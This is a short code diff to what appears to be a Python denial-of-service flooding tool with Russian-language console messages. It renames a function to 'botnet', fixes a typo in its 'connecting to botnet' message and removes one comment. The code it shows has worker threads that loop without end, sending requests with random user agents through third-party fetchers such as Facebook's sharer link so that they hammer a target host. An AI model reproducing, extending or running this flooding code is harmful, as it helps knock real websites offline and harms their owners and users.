@@ -162,11 +162,11 @@ bots = [
     "http://www.facebook.com/sharer/sharer.php?u="]
 
 
-def bot_hammering(url):
+def botnet(url):
     try:
         while True:
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
-            print("\033[94mПодключение к ботнеру...\033[0m")
+            print("\033[94mПодключение к ботнету...\033[0m")
             time.sleep(.1)
     except:
         time.sleep(.1)
@@ -203,7 +203,7 @@ def dos():
 def dos2():
     while True:
         w.get()
-        bot_hammering(random.choice(bots) + "http://" + host)
+        botnet(random.choice(bots) + "http://" + host)
         w.task_done()
 
 
@@ -227,7 +227,6 @@ except socket.error as e:
     print("\033[91mОшибка! Проверьте правильноссть IP и Порта.\033[0m")
 
 i = 0
-# очередь задач
 q = Queue()
 w = Queue()
 while True:
